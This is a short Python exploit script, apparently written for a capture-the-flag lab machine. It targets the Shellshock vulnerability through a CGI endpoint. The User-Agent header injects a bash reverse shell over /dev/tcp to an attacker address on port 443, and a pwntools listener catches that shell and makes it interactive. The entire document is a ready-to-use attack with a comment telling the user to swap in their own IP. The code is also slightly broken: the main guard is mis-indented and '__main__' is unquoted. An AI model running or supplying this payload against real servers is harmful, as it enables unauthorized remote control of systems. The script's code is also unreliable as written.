#!/usr/bin/python3

import requests, threading
from pwn import *

url = 'http://10.10.10.56/cgi-bin/user.sh'

def shellshock():
  user_agent= { "User-Agent" : "() { :; }; /bin/bash >& /dev/tcp/10.10.14.30/443" }	#Modifique su IṔ
  requests.get(url, headers=user_agent)

 if __name__ == __main__:
  threading.Thread(target=shellshock).start()
  shell = listen(443).wait_for_connection()
  shell.interactive()
